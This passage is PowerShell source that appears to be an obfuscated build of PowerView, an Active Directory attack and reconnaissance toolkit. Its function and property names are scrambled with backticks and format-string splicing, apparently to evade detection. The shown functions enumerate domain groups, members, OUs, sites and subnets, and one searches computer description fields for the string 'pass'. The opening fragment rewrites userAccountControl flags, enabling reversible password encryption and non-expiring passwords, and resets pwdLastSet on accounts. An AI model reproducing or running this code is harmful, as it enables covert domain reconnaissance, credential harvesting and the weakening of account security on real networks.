        ${U`Ac`V`AluEs} = &("{0}{2}{3}{1}" -f 'Ge','ct','t',("{1}{0}" -f 'je','-ADOb')) @Arguments | &("{1}{0}" -f ("{0}{1}"-f 'le','ct'),'se') ("{4}{2}{3}{1}{5}{0}"-f'l','c','oun','t',("{2}{1}{0}"-f'eracc','s','u'),("{0}{1}"-f'o','ntro')) | &("{1}{3}{4}{2}{0}" -f 'e',("{1}{2}{0}" -f'er','Con','v'),("{0}{1}" -f'Va','lu'),("{1}{0}" -f 'rom','tF'),("{0}{1}" -f'-','UAC'))

        if(${rep`AIr}) {

            if(${U`A`CvalUEs}."K`eyS" -contains ("{3}{4}{0}{2}{1}{5}"-f("{1}{0}" -f '_','D_TEXT'),("{1}{0}" -f 'ALLOW','D_'),'PW',("{0}{1}" -f'E','NCRYPT'),'E','ED')) {
                
                &("{0}{2}{3}{1}"-f ("{1}{0}"-f '-A','Set'),'ect','DO','bj') @Arguments -PropertyName ("{2}{4}{5}{0}{1}{3}"-f ("{0}{1}"-f 'tcon','t'),'r',("{0}{1}" -f'u','sera'),'ol','cco','un') -PropertyXorValue 128
            }

            
            &("{2}{0}{1}{3}"-f ("{1}{0}"-f'-ADO','t'),("{0}{1}"-f 'b','jec'),'Se','t') @Arguments -PropertyName ("{2}{0}{1}{3}" -f'dla',("{1}{0}"-f 'e','sts'),'pw','t') -PropertyValue ('-1')
        }

        else {

            if(${Ua`C`ValU`ES}."kE`Ys" -contains ("{1}{0}{2}{3}"-f ("{0}{1}"-f'EX','PI'),("{1}{0}" -f 'ONT_','D'),'R',("{1}{2}{0}"-f'RD','E_PASS','WO'))) {
                
                &("{0}{1}{2}{3}"-f'Se','t-A','DOb',("{0}{1}" -f'jec','t')) @Arguments -PropertyName ("{0}{2}{3}{4}{1}"-f'us',("{1}{0}" -f 'rol','t'),("{0}{2}{1}"-f'era','o','cc'),("{1}{0}" -f'tc','un'),'on') -PropertyXorValue 65536
            }

            if(${Uac`Val`UEs}."Ke`ys" -notcontains ("{1}{0}{4}{2}{5}{3}" -f 'N','E',("{0}{1}" -f 'TED_T','EX'),("{1}{0}" -f 'LOWED','L'),("{1}{0}"-f'RYP','C'),("{2}{0}{1}" -f'_','PWD_A','T'))) {
                
                &("{0}{2}{1}{3}" -f'Se','jec',("{1}{2}{0}"-f 'Ob','t-A','D'),'t') @Arguments -PropertyName ("{0}{1}{3}{2}" -f("{0}{1}"-f'u','ser'),("{0}{1}"-f'acc','o'),("{0}{1}"-f't','rol'),("{0}{1}"-f 'unt','con')) -PropertyXorValue 128
            }

            
            &("{2}{0}{1}" -f'-AD',("{1}{0}"-f'ect','Obj'),'Set') @Arguments -PropertyName ("{1}{0}{2}{3}"-f 'st',("{0}{1}" -f 'pwdl','a'),'s','et') -PropertyValue 0
        }
    }
}


function GE`T-c`omPUTERPr`o`PeRty {


    [CmdletBinding()]
    param(
        [String[]]
        ${p`RO`PerTI`eS},

        [String]
        ${DO`Main},

        [String]
        ${d`om`AiNcoN`Tr`OLLER},

        [ValidateRange(1,10000)] 
        [Int]
        ${PAge`SI`ze} = 200
    )

    if(${P`ROpertI`Es}) {
        
        ${p`RoPer`T`Ies} = ,("{1}{0}" -f'e','nam') + ${p`RO`P`ERties} | &("{1}{2}{0}"-f'ct',("{1}{0}{2}"-f'-Ob','Sort','j'),'e') -Unique
        &("{2}{3}{4}{0}{1}"-f'N',("{1}{3}{2}{0}"-f 'er','et','t','Compu'),'Ge','t','-') -Domain ${dOM`A`in} -DomainController ${dOm`Ai`Nc`oNTrOlLer} -FullData -PageSize ${Pa`G`esIzE} | &("{2}{1}{3}{4}{0}"-f ("{0}{1}" -f'j','ect'),'el','S',("{1}{0}"-f't-O','ec'),'b') -Property ${PrO`PE`RtiES}
    }
    else {
        
        &("{0}{3}{2}{1}" -f'G',("{2}{0}{1}" -f'omp','uter','C'),("{1}{0}"-f 'Net','-'),'et') -Domain ${DoM`A`in} -DomainController ${dOmAI`NcO`N`T`ROlLEr} -FullData -PageSize ${pa`g`esI`Ze} | &("{3}{1}{0}{4}{2}" -f'ct-','le','t','Se',("{1}{0}"-f 'bjec','O')) -first 1 | &("{1}{0}{2}{3}" -f't-M','Ge','em','ber') -MemberType ("{0}{2}{1}"-f("{0}{1}" -f '*','Pro'),'y',("{0}{1}"-f'per','t')) | &("{0}{1}{2}" -f'S',("{2}{1}{0}"-f 'j','ect-Ob','el'),'ect') -Property ("{1}{0}"-f 'e','Nam')
    }
}


function F`inD-CO`MPuteR`Fi`ElD {


    [CmdletBinding()]
    param(
        [Parameter(poSITIOn=0,vALuEFrOMPIPeline=${T`RuE})]
        [Alias({"{1}{0}"-f 'm','Ter'})]
        [String]
        ${S`eARCH`TE`Rm} = ("{0}{1}"-f'pas','s'),

        [Alias({"{0}{1}"-f 'Fie','ld'})]
        [String]
        ${s`ear`CH`FIelD} = ("{2}{0}{1}"-f ("{0}{1}" -f'cri','pt'),'ion','des'),

        [String]
        ${aD`SP`ATH},

        [String]
        ${DoMA`IN},

        [String]
        ${d`Om`AINco`NTrolLER},

        [ValidateRange(1,10000)] 
        [Int]
        ${p`Ag`esIZE} = 200
    )

    process {
        &("{2}{4}{1}{0}{3}" -f("{0}{1}" -f 'pu','te'),'Com','Ge','r',("{0}{1}" -f't-N','et')) -ADSpath ${a`DsPA`Th} -Domain ${D`Oma`IN} -DomainController ${domAinc`onTROl`L`Er} -FullData -Filter "($SearchField=*$SearchTerm*)" -PageSize ${Pa`g`e`SiZE} | &("{0}{3}{2}{1}"-f 'Se','ct',("{1}{2}{0}"-f'e','c','t-Obj'),'le') ("{1}{0}{2}" -f 'unt',("{1}{0}"-f 'co','samac'),("{1}{0}" -f 'ame','n')),${SeaR`C`hFiEld}
    }
}


function gET`-`NEtoU {


    [CmdletBinding()]
    Param (
        [Parameter(ValUeFRoMPiPeliNE=${TR`Ue})]
        [String]
        ${oU`N`Ame} = '*',

        [String]
        ${Gu`Id},

        [String]
        ${Dom`A`iN},

        [String]
        ${doMai`NContR`oLL`Er},

        [String]
        ${A`d`spAtH},

        [Switch]
        ${f`UL`Ldata},

        [ValidateRange(1,10000)] 
        [Int]
        ${p`A`gesizE} = 200
    )

    begin {
        ${o`USEA`RCh`ER} = &("{0}{4}{3}{1}{2}" -f 'Ge','ear',("{0}{1}" -f 'ch','er'),'inS',("{0}{2}{1}"-f't-','ma','Do')) -Domain ${do`MA`IN} -DomainController ${dOMA`INco`N`TrOLLEr} -ADSpath ${adS`pA`TH} -PageSize ${PAG`ESize}
    }
    process {
        if (${o`US`EarCHEr}) {
            if (${Gu`ID}) {
                
                ${O`USeaRch`Er}."filT`eR"="(&(objectCategory=organizationalUnit)(name=$OUName)(gplink=*$GUID*))"
            }
            else {
                ${OUse`Arc`hEr}."fI`Lter"="(&(objectCategory=organizationalUnit)(name=$OUName))"
            }

            ${O`UsEAR`c`HeR}.("{0}{1}"-f 'Fi',("{1}{0}" -f'All','nd'))."I`NVo`KE"() | &("{0}{2}{3}{1}"-f'Wh','ct','ere',("{1}{0}"-f 'je','-Ob')) {${_}} | &("{3}{2}{1}{0}" -f 't','jec',("{2}{1}{0}"-f'Ob','ch-','orEa'),'F') {
                if (${F`Ull`d`AtA}) {
                    
                    &("{2}{3}{4}{0}{1}{5}"-f'DA','P','Con','v',("{1}{0}"-f'L','ert-'),("{0}{1}"-f'Proper','ty')) -Properties ${_}."p`RoP`Erti`es"
                }
                else { 
                    
                    ${_}."PROPe`RtI`ES"."aD`sP`ATH"
                }
            }
        }
    }
}


function GET-NE`T`S`I`Te {


    [CmdletBinding()]
    Param (
        [Parameter(vAluEfrompIPELinE=${t`RuE})]
        [String]
        ${SiTE`N`Ame} = "*",

        [String]
        ${Do`ma`In},

        [String]
        ${d`oMaI`NCONt`RoLL`er},

        [String]
        ${adSp`A`Th},

        [String]
        ${g`UiD},

        [Switch]
        ${FUl`l`d`Ata},

        [ValidateRange(1,10000)] 
        [Int]
        ${PA`G`eSIZE} = 200
    )

    begin {
        ${SItESea`RCH`Er} = &("{3}{2}{1}{0}"-f'er',("{1}{2}{3}{0}"-f 'ch','mainSe','a','r'),("{1}{0}" -f 'Do','t-'),'Ge') -ADSpath ${A`D`sPAtH} -Domain ${dO`M`AIN} -DomainController ${d`oMAIncOn`TrO`ller} -ADSprefix ("{5}{3}{4}{1}{2}{0}"-f'n',("{0}{1}"-f 'i','gur'),("{1}{0}"-f'o','ati'),'s',("{0}{2}{1}"-f ',CN','onf','=C'),("{0}{1}"-f 'CN=Si','te')) -PageSize ${PAG`ESize}
    }
    process {
        if(${s`iteSear`ch`er}) {

            if (${g`UID}) {
                
                ${sIt`ESE`ARCheR}."F`Ilt`ER"="(&(objectCategory=site)(name=$SiteName)(gplink=*$GUID*))"
            }
            else {
                ${SitESe`A`RcheR}."fI`L`TeR"="(&(objectCategory=site)(name=$SiteName))"
            }
            
            try {
                ${siT`e`SEA`RCHer}.("{1}{2}{0}" -f 'l','Fin','dAl')."in`VoKE"() | &("{1}{3}{0}{2}" -f 'Ob','Whe',("{1}{0}" -f 't','jec'),'re-') {${_}} | &("{2}{1}{3}{0}" -f't','c',("{1}{0}"-f'Ea','For'),("{1}{2}{0}"-f 'jec','h-O','b')) {
                    if (${Fulld`A`Ta}) {
                        
                        &("{2}{0}{4}{3}{1}{6}{5}" -f 'e','L',("{0}{1}"-f'Co','nv'),'-','rt',("{0}{1}"-f 'pe','rty'),("{1}{0}" -f 'o','DAPPr')) -Properties ${_}."p`Ro`pErt`iES"
                    }
                    else {
                        
                        ${_}."PR`OpeR`TIes"."n`Ame"
                    }
                }
            }
            catch {
                &("{1}{2}{0}" -f("{1}{0}{2}" -f 'Warni','e-','ng'),'Wr','it') ${_}
            }
        }
    }
}


function gEt-N`e`Ts`UBNeT {


    [CmdletBinding()]
    Param (
        [Parameter(VaLuEFRoMPiPeLiNE=${TR`Ue})]
        [String]
        ${SiT`En`A`ME} = "*",

        [String]
        ${d`O`maiN},

        [String]
        ${aDs`paTH},

        [String]
        ${DOmAi`NC`ON`TrolLeR},

        [Switch]
        ${FUlLd`ATa},

        [ValidateRange(1,10000)] 
        [Int]
        ${pAGe`sIzE} = 200
    )

    begin {
        ${Su`BnE`TS`eAR`ChER} = &("{2}{1}{0}{4}{3}" -f 'o',("{0}{1}" -f'et-','D'),'G',("{0}{2}{1}" -f'Sea','cher','r'),("{1}{0}"-f'n','mai')) -Domain ${dOMA`iN} -DomainController ${doMaiNCO`N`Tr`o`lleR} -ADSpath ${aD`s`PatH} -ADSprefix ("{0}{6}{2}{3}{1}{4}{7}{9}{5}{8}"-f'C',("{0}{1}" -f ',C','N=S'),'et','s','it',("{0}{1}{2}"-f'o','nfi','gura'),("{1}{0}" -f 'n','N=Sub'),("{1}{0}" -f',CN','es'),("{0}{1}" -f'ti','on'),'=C') -PageSize ${Pa`gESI`zE}
    }

    process {
        if(${SU`BneTSeaRCh`eR}) {

            ${subnet`s`e`Arc`HER}."Fi`Lt`eR"=(("{2}{0}{6}{7}{4}{5}{3}{1}" -f ((("{0}{1}" -f '&','(ob'))),'t))','(','ne',("{1}{2}{0}" -f 'y=s','go','r'),'ub','je',("{2}{0}{1}" -f't','Cate','c')))

            try {
                ${S`UBNe`TSe`ARcHeR}.("{1}{0}" -f("{0}{2}{1}"-f 'ind','l','Al'),'F')."I`NVo`ke"() | &("{0}{2}{3}{1}"-f'Whe',("{0}{1}"-f'j','ect'),'re','-Ob') {${_}} | &("{2}{0}{3}{1}" -f("{1}{0}" -f 'Ob','ch-'),'ct',("{0}{1}"-f 'Fo','rEa'),'je') {
                    if (${f`Ul`ldATA}) {
                        
                        &("{5}{0}{4}{2}{1}{3}"-f'o',("{1}{0}"-f 'er','op'),("{3}{1}{0}{2}" -f'APP','t-LD','r','er'),'ty','nv','C') -Properties ${_}."p`R`OPErTIES" | &("{0}{3}{1}{2}" -f'W','Obj','ect',("{0}{1}" -f 'he','re-')) { ${_}."si`T`eOBJEcT" -match "CN=$SiteName" }
                    }
                    else {
                        
                        if ( (${sit`en`AME} -and (${_}."PropE`Rt`IeS"."SiT`e`object" -match "CN=$SiteName,")) -or (${si`T`ENa`mE} -eq '*')) {

                            ${SuBn`eTpR`oPE`RTies} = @{
                                ("{1}{0}"-f'et',("{0}{1}" -f 'Su','bn')) = ${_}."PROpErT`i`ES"."n`AME"[0]
                            }
                            try {
                                ${suB`NetP`R`opEr`TIEs}[("{0}{1}"-f'Sit','e')] = (${_}."p`Ro`PErti`eS"."s`I`TeobJecT"[0]).("{0}{1}" -f("{1}{0}" -f 'li','sp'),'t')."INv`OkE"(",")[0]
                            }
                            catch {
                                ${sU`Bn`etP`ROPe`RTieS}[("{1}{0}" -f'e','Sit')] = ("{0}{1}"-f'Err','or')
                            }

                            &("{2}{1}{0}"-f'ect','j',("{0}{1}{2}"-f 'N','ew-','Ob')) -TypeName ("{2}{1}{0}" -f 'ect','bj','PSO') -Property ${s`Ub`NETP`RopErtiEs}                 
                        }
                    }
                }
            }
            catch {
                &("{1}{0}{2}{3}"-f'-Wa',("{0}{1}"-f'Writ','e'),'rn','ing') ${_}
            }
        }
    }
}


function Get-D`OmaiN`S`iD {


    param(
        [String]
        ${D`oM`AIN}
    )

    ${Fo`Un`d`domaiN} = &("{2}{1}{3}{0}" -f("{2}{1}{0}" -f 'in','a','Dom'),'Ne',("{0}{1}" -f'G','et-'),'t') -Domain ${DO`Ma`IN}
    
    if(${Fo`Un`ddoM`Ain}) {
        
        ${Pr`IMAr`y`dc} = ${f`o`UNdD`omAIn}."pdCR`olE`owNeR"
        ${PrimArYDc`S`Id} = (&("{2}{1}{3}{0}" -f 'ter',("{0}{2}{1}" -f 'NetCo','p','m'),("{1}{0}" -f't-','Ge'),'u') -Domain ${d`OMain} -ComputerName ${P`RIMAR`YDC} -FullData)."ObJ`Ec`TSId"
        ${pAr`TS} = ${p`R`ImaRy`DCSID}.("{1}{0}" -f 'it','spl')."i`NvokE"("-")
        ${PA`RTs}[0..(${P`A`RtS}."L`e`NGTH" -2)] -join "-"
    }
}


function g`eT-NETG`RoUP {


    [CmdletBinding()]
    param(
        [Parameter(vaLUEfrOmPIpeLIne=${t`RUE})]
        [String]
        ${GRo`U`PNaME} = '*',

        [String]
        ${S`ID},

        [String]
        ${u`s`erNAME},

        [String]
        ${F`ILt`er},

        [String]
        ${dO`M`AIN},
        
        [String]
        ${Dom`A`iNco`N`TROLLeR},
        
        [String]
        ${AdSP`ATh},

        [Switch]
        ${AdMI`Nc`OuNt},

        [Switch]
        ${fUl`l`d`Ata},

        [Switch]
        ${R`AWs`idS},

        [ValidateRange(1,10000)] 
        [Int]
        ${PA`G`e`sIZe} = 200
    )

    begin {
        ${group`sE`A`RCheR} = &("{2}{4}{1}{0}{5}{3}" -f'm','o',("{1}{0}" -f'-','Get'),("{1}{0}"-f 'cher','r'),'D',("{0}{1}" -f 'ai','nSea')) -Domain ${d`OM`AiN} -DomainController ${DO`MaiN`cOnTROl`l`Er} -ADSpath ${Ad`SpaTH} -PageSize ${p`A`gESize}
    }

    process {
        if(${G`RoUpSE`Ar`ChER}) {

            if(${a`dM`INC`ounT}) {
                &("{2}{0}{1}" -f 's','e',("{1}{0}{2}" -f 'r','W','ite-Verbo')) ("{1}{6}{4}{5}{3}{2}{0}"-f '=1','Che',("{3}{1}{0}{2}" -f 'ou','C','nt','r admin'),'o','ng',' f','cki')
                ${FIL`T`eR} += ("{1}{0}{2}{3}" -f 'c',((("{0}{1}" -f '(admi','n'))),("{1}{0}" -f 't=','oun'),'1)')
            }

            if (${U`s`ErNAme}) {
                
                ${us`eR} = &("{0}{3}{2}{1}" -f'G',("{0}{1}" -f 'je','ct'),'DOb',("{1}{0}"-f 'A','et-')) -SamAccountName ${USer`N`Ame} -Domain ${DOMa`iN} -DomainController ${DOmaiNco`N`T`RO`LL`Er} -ReturnRaw -PageSize ${PA`ge`SIZe}

                
                ${uS`ERDI`Rec`TO`RyeNTRy} = ${US`eR}.("{2}{3}{0}{4}{1}" -f 're',("{0}{2}{1}" -f 'toryEn','y','tr'),'G',("{1}{0}" -f 'i','etD'),'c')."i`Nv`OKE"()

                
                ${u`seRD`irecto`RYent`Ry}.("{1}{2}{3}{0}"-f 'e',("{1}{0}"-f'efreshC','R'),'a','ch')."i`NvOkE"(("{2}{0}{1}"-f 'rou','ps',("{0}{1}{2}" -f't','oken','G')))

                ${USER`DI`ReCToRy`E`N`TrY}."tOk`enGRou`Ps" | &("{1}{0}{2}" -f ("{1}{2}{0}"-f'j','ch','-Ob'),("{0}{1}" -f'Fo','rea'),'ect') {
                    
                    ${G`R`oupS`id} = (&("{2}{1}{0}"-f'ct',("{0}{1}"-f 'w-Ob','je'),'Ne') ("{4}{0}{2}{11}{5}{7}{3}{6}{9}{10}{8}{1}" -f'st','r','em.',("{0}{1}" -f'y.P','ri'),'Sy','ecu',("{1}{2}{0}{3}" -f'.Secur','nc','ipal','i'),'rit',("{1}{0}{2}" -f't','n','ifie'),'tyI','de','S')(${_},0))."v`AlUe"
                    
                    
                    if(!(${grOu`pSiD} -match (((("{0}{1}"-f'^S-','1')+'-5-'+("{1}{0}" -f '5','32-')+'4'+'5'+("{1}{0}"-f'-51','srM')+("{0}{1}"-f'3','cJb'))  -CrepLAcE([chAr]99+[chAr]74+[chAr]98),[chAr]36-rEPLace ([chAr]115+[chAr]114+[chAr]77),[chAr]124)))) {
                        if(${fuLl`da`Ta}) {
                            &("{0}{2}{3}{1}" -f ("{1}{0}"-f 't-','Ge'),'ect','AD','Obj') -SID ${grOu`ps`Id} -PageSize ${p`A`GEs`IZE}
                        }
                        else {
                            if(${rawSi`dS}) {
                                ${gR`oUPS`Id}
                            }
                            else {
                                &("{4}{1}{2}{5}{3}{0}" -f 'ame',("{0}{1}" -f 'onve','r'),'t',("{0}{1}" -f'idTo','N'),'C','-S') ${gRo`UPsID}
                            }
                        }
                    }
                }
            }
            else {
                if (${s`Id}) {
                    ${gR`oU`Ps`e`ArCHeR}."FIL`TER" = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }
                else {
                    ${groUpsEaR`Ch`Er}."fi`ltEr" = "(&(objectCategory=group)(name=$GroupName)$Filter)"
                }
            
                ${gro`UPsE`ArC`her}.("{0}{1}{2}"-f("{1}{0}"-f'indA','F'),'l','l')."INvo`kE"() | &("{0}{1}{3}{2}"-f ("{0}{1}"-f'Whe','re'),'-O','ct','bje') {${_}} | &("{3}{0}{2}{1}" -f 'O','ct','bje',("{2}{0}{1}" -f 'rEa','ch-','Fo')) {
                    
                    if (${fUL`lDa`Ta}) {
                        
                        &("{1}{3}{0}{2}"-f'r',("{0}{2}{1}"-f'C','t-L','onver'),'ty',("{1}{0}"-f 'APPrope','D')) -Properties ${_}."proPER`TI`eS"
                    }
                    else {
                        
                        ${_}."pRop`Ert`IES"."s`A`m`ACcOuntN`AmE"
                    }
                }
            }
        }
    }
}


function g`E`T`-Net`GrOu`PmE`mbER {


    [CmdletBinding()]
    param(
        [Parameter(valuefrOmpiPeLIne=${t`Rue})]
        [String]
        ${Gr`oUPN`AMe},

        [String]
        ${S`id},

        [String]
        ${DO`MaiN} = (&("{0}{1}{2}" -f'Get',("{1}{2}{0}"-f'm','-N','etDo'),'ain'))."N`AmE",

        [String]
        ${D`oMAIncOntR`O`L`lER},

        [String]
        ${Ads`PaTH},

        [Switch]
        ${fu`lLDA`TA},

        [Switch]
        ${rE`Cur`Se},

        [Switch]
        ${uSEm`AT`chiNgrU`LE},

        [ValidateRange(1,10000)] 
        [Int]
        ${pag`e`s`IZE} = 200
    )

    begin {
        
        ${GROupSeAr`c`h`eR} = &("{3}{0}{2}{1}" -f'ma',("{1}{0}" -f'rcher','a'),("{0}{1}" -f'in','Se'),("{1}{0}" -f 'o','Get-D')) -Domain ${d`oMA`in} -DomainController ${Dom`Ai`NcoN`TRolL`ER} -ADSpath ${aD`S`pATH} -PageSize ${PA`ge`SizE}

        if(!${D`O`m`AinCONtROl`l`ER}) {
            ${DOma`I`N`CONTrOllER} = ((&("{2}{0}{1}" -f 'ma','in',("{0}{1}{2}" -f'G','et-Net','Do')))."pdCrOLe`oWn`er")."na`Me"
        }
    }

    process {

        if (${GRo`UP`sEARcHeR}) {

            if (${reCUR`se} -and ${Us`eMatcH`Ing`RUlE}) {
                
                if (${G`Ro`UpNamE}) {
                    ${grO`Up} = &("{2}{1}{0}"-f ("{0}{1}" -f 'rou','p'),("{0}{2}{1}" -f't','NetG','-'),'Ge') -GroupName ${GR`OUPN`AME} -Domain ${DOM`A`iN} -FullData -PageSize ${PA`G`esIzE}
                }
                elseif (${S`ID}) {
                    ${gR`oUP} = &("{1}{0}{3}{2}" -f("{0}{1}" -f't','-Net'),'Ge','oup','Gr') -SID ${S`iD} -Domain ${Do`M`Ain} -FullData -PageSize ${paG`E`SIZE}
                }
                else {
                    
                    ${s`id} = (&("{2}{1}{3}{0}"-f 'ID',("{0}{1}"-f'-Do','m'),'Get',("{1}{0}" -f 'S','ain')) -Domain ${do`M`AIn}) + ("{0}{1}"-f '-51','2')
                    ${GR`O`Up} = &("{2}{1}{0}" -f'oup','Gr',("{2}{0}{1}"-f '-','Net','Get')) -SID ${s`id} -Domain ${d`OmaIn} -FullData -PageSize ${pAGe`SI`ZE}
                }
                ${GROU`P`dN} = ${gR`ouP}."DIS`TInGui`shEdNA`mE"
                ${GRO`UPFOUnd`N`Ame} = ${Gro`UP}."Na`me"

                if (${gR`oU`pdN}) {
                    ${G`ROU`pS`eARch`eR}."fILT`er" = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupDN)$Filter)"
                    ${Gro`U`PSEarcHER}."P`Ro`PErtIESt`oLOAd".("{1}{0}" -f'ge',("{0}{1}"-f'A','ddRan'))."INv`O`KE"((("{0}{3}{1}{2}"-f("{0}{1}" -f 'd','ist'),("{1}{0}{2}" -f 'u','g','ished'),("{1}{0}"-f'me','Na'),'in'),("{2}{1}{0}{3}"-f ("{0}{1}" -f'accoun','t'),'m','sa',("{0}{1}" -f'ty','pe')),("{0}{3}{1}{2}"-f 'l','t',("{0}{1}" -f'logo','n'),'as'),("{2}{0}{4}{3}{1}"-f 'gon',("{1}{0}{2}"-f 'stam','me','p'),("{0}{1}"-f'la','stlo'),'i','t'),("{2}{1}{4}{0}{3}"-f ("{0}{2}{1}{3}"-f'ag','on','ati','da'),("{0}{1}{2}" -f 'o','r','epro'),'dsc','ta','p'),("{1}{0}{2}"-f'e','obj',("{0}{1}"-f'c','tsid')),("{2}{1}{0}" -f ("{0}{1}"-f 'reate','d'),'nc','whe'),("{2}{0}{3}{1}{4}" -f 'pa',("{1}{0}"-f 'ord','w'),'bad','ss',("{1}{0}"-f 'me','ti')),("{3}{0}{2}{1}{4}"-f 'c',("{1}{2}{0}" -f'e','ntexpi','r'),'ou','ac','s'),("{2}{5}{1}{3}{4}{0}" -f't','c',("{1}{0}" -f 'cri','is'),("{0}{2}{1}" -f 'al','st','sy'),("{0}{2}{1}"-f 'emob','c','je'),'ti'),("{0}{1}"-f 'nam','e'),("{1}{2}{0}" -f ("{0}{1}" -f'c','hanged'),'us','n'),("{1}{2}{0}"-f ("{1}{0}"-f 'gory','e'),'obj',("{0}{1}" -f'e','ctcat')),("{3}{2}{1}{0}"-f("{0}{1}" -f 'tio','n'),("{0}{1}"-f 'cri','p'),'s','de'),("{0}{1}{2}" -f'c',("{0}{1}" -f 'odepa','g'),'e'),("{1}{0}{2}" -f("{0}{1}{2}"-f'a','ncet','yp'),("{0}{1}" -f'ins','t'),'e'),("{2}{0}{1}"-f'd','e',("{0}{2}{1}"-f'co','ntryco','u')),("{1}{5}{4}{2}{3}{0}" -f("{1}{0}"-f 'ame','n'),'dis',("{0}{1}"-f'ish','e'),'d','gu','tin'),'cn',("{0}{1}{2}"-f("{0}{1}" -f 'admin','co'),'u','nt'),("{1}{2}{0}"-f 's',("{0}{1}" -f 'logonho','u'),'r'),("{1}{3}{2}{0}" -f'ass','obj','cl','ect'),("{1}{2}{0}"-f 't','lo',("{2}{1}{0}" -f'oun','onc','g')),("{1}{2}{0}" -f 'ted',("{1}{0}" -f'cr','usn'),'ea'),("{3}{4}{1}{2}{5}{0}"-f'l','tc',("{1}{0}" -f 'tr','on'),'use',("{1}{0}" -f'coun','rac'),'o'),("{2}{1}{0}" -f'id',("{1}{0}" -f'ctgu','bje'),'o'),("{2}{0}{1}{3}" -f ("{2}{3}{0}{1}" -f'ryg','rou','r','ima'),'p','p','id'),("{0}{3}{1}{2}"-f'l','og','off',("{0}{1}"-f'as','tl')),("{2}{1}{0}{3}" -f("{1}{2}{0}" -f 'ntnam','cco','u'),'a','sam','e'),("{1}{2}{0}"-f("{0}{2}{1}" -f'dpwdc','unt','o'),'b','a'),("{2}{1}{0}" -f 'ged','n',("{1}{0}"-f'encha','wh')),("{0}{2}{1}" -f'm','f',("{1}{0}"-f 'ero','emb')),("{0}{2}{1}"-f'p',("{2}{1}{0}"-f 't','lastse','d'),'w'),("{1}{0}"-f("{0}{1}" -f'p','ath'),'ads')))

                    ${MEMb`eRs} = ${gRou`PseaR`c`h`Er}.("{0}{1}"-f'Fi',("{1}{0}" -f'l','ndAl'))."i`NvokE"()
                    ${G`ROU`PfouNdn`AME} = ${Gro`Up`NamE}
                }
                else {
                    &("{2}{1}{0}" -f 'or',("{0}{2}{1}"-f'rit','rr','e-E'),'W') ("{4}{5}{1}{0}{2}{3}"-f'in',("{0}{2}{1}"-f 'le t',' f','o'),("{1}{0}" -f 'Gro','d '),'up','Un','ab')
                }
            }
            else {
                if (${gROU`PN`AME}) {
                    ${group`sear`C`H`eR}."f`ILteR" = "(&(objectCategory=group)(name=$GroupName)$Filter)"
                }
                elseif (${s`Id}) {
                    ${GR`oUpSear`CHER}."fILT`ER" = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }
                else {
                    
                    ${S`id} = (&("{2}{1}{0}" -f ("{2}{1}{0}"-f'SID','in','oma'),'t-D','Ge') -Domain ${DO`ma`iN}) + ("{1}{0}" -f '512','-')
                    ${gr`oupse`ArcH`er}."fiL`Ter" = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }

                ${GR`oUpsE`A`RChER}.("{1}{2}{0}" -f("{0}{1}" -f 'ndAl','l'),'F','i')."invo`Ke"() | &("{0}{2}{1}" -f ("{1}{0}"-f 'orE','F'),("{2}{1}{3}{0}" -f 't','h-O','c','bjec'),'a') {
                    try {
                        if (!(${_}) -or !(${_}."P`Ro`PErtIEs") -or !(${_}."p`RopERt`I`es"."nA`ME")) { continue }

                        ${GrO`U`Pf`OUn`dnAME} = ${_}."P`RO`PErt`ieS"."NA`me"[0]
                        ${MEM`BeRs} = @()

                        if (${_}."PR`OPER`TIES"."meM`B`eR"."CoU`Nt" -eq 0) {
                            ${F`inIs`hED} = ${FA`l`Se}
                            ${b`o`TToM} = 0
                            ${t`Op} = 0
                            while(!${fiNi`Shed}) {
                                ${T`OP} = ${Bo`T`ToM} + 1499
                                ${mE`mberrA`NGE}="member;range=$Bottom-$Top"
                                ${b`o`TTOM} += 1500
                                ${GrO`Upsea`R`Cher}."pRoPERt`I`Es`ToL`oAD".("{1}{0}"-f 'r',("{0}{1}" -f'C','lea'))."inVo`KE"()
                                [void]${gRou`PsearC`HEr}."proPe`RTi`estOLoAd".("{0}{1}" -f'Ad','d')."iN`V`OKE"("$MemberRange")
                                try {
                                    ${rE`s`Ult} = ${Gr`OUPSea`RcH`ER}.("{2}{1}{0}"-f'e','On',("{0}{1}"-f'Fin','d'))."inV`okE"()
                                    if (${r`e`SuLT}) {
                                        ${Ra`Ng`ED`proPE`RTY} = ${_}."PRo`p`eR`TIes"."PRO`PeRty`NAMES" -like ("{2}{1}{4}{0}{3}"-f'a','em','m',("{1}{0}" -f'=*','nge'),("{0}{1}"-f 'ber',';r'))
                                        ${RES`UlTs} = ${_}."PrO`PErT`ies".("{1}{0}" -f 'tem','i')."INv`oke"(${rA`Ng`e`dpr`oPERtY})
                                        if (${RES`U`ltS}."co`UNT" -eq 0) {
                                            ${FI`NISHed} = ${tR`Ue}
                                        }
                                        else {
                                            ${Res`U`lts} | &("{3}{2}{1}{0}" -f("{1}{0}" -f't','bjec'),'h-O','Eac','For') {
                                                ${mEm`BE`Rs} += ${_}
                                            }
                                        }
                                    }
                                    else {
                                        ${FI`N`ishEd} = ${t`RUe}
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    ${Fin`I`shEd} = ${tR`UE}
                                }
                            }
                        } 
                        else {
                            ${MeM`BErS} = ${_}."pRoPER`T`IES"."m`EMb`eR"
                        }
                    } 
                    catch {
                        &("{0}{2}{1}{3}" -f("{2}{1}{0}"-f 'ite-Ve','r','W'),'os','rb','e') ${_}
                    }
                }
            }

            ${meMb`ERS} | &("{1}{0}{3}{2}" -f'h','W','ect',("{0}{1}"-f'er','e-Obj')) {${_}} | &("{0}{2}{4}{1}{3}" -f'F','ach','or',("{0}{1}"-f '-','Object'),'E') {
                
                if (${r`ECu`Rse} -and ${uSEm`AtcHI`NgRu`LE}) {
                    ${ProP`e`RTiES} = ${_}."PropeR`Ti`ES"
                } 
                else {
                    if(${D`om`AINcont`R`Ol`ler}) {
                        ${r`e`suLt} = [adsi]"LDAP://$DomainController/$_"
                    }
                    else {
                        ${REs`U`LT} = [adsi]"LDAP://$_"
                    }
                    if(${r`ESu`lt}){
                        ${p`RoP`erTies} = ${R`ESu`lt}."pr`OPErTi`ES"
                    }
                }

                if(${Pr`OpeRTI`eS}) {

                    if(${PRop`er`T`iES}."sam`AccoUnt`TypE" -notmatch ("{2}{0}{1}" -f ("{1}{0}"-f '063','53'),'68','80')) {
